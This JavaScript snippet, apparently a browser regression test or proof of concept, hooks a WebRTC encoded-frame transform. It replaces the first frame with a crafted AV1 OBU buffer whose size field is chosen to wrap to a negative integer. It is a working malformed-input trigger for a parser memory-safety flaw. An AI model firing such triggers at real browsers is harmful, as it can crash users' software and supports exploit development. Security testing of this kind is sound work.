onrtctransform = event => {
    const reader = event.transformer.readable.getReader();
    const writer = event.transformer.writable.getWriter();
    let fired = false;
    function pump() {
        reader.read().then(({ value, done }) => {
            if (done)
                return;
            if (!fired) {
                fired = true;
                try {
                    // Three OBUs: sizes 10 / (1 + 0xFFFFFFDB -> int -36) / 20.
                    const obu1Payload = 0xFFFFFFDB;
                    const total = 0x100000000;
                    const bytes = new Uint8Array(total);
                    let off = 0;
                    bytes[off++] = 0x32;
                    bytes[off++] = 0x09;
                    for (let i = 0; i < 9; ++i)
                        bytes[off++] = 0xAA;
                    bytes[off++] = 0x32;
                    bytes[off++] = 0xDB;
                    bytes[off++] = 0xFF;
                    bytes[off++] = 0xFF;
                    bytes[off++] = 0xFF;
                    bytes[off++] = 0x0F;
                    off += obu1Payload;
                    bytes[off++] = 0x30;
                    for (let i = 0; i < 19; ++i)
                        bytes[off++] = 0xBB;
                    value.data = bytes.buffer;
                } catch (e) {
                }
                writer.write(value);
                self.postMessage("wrote");
            } else
                writer.write(value);
            pump();
        });
    }
    pump();
};
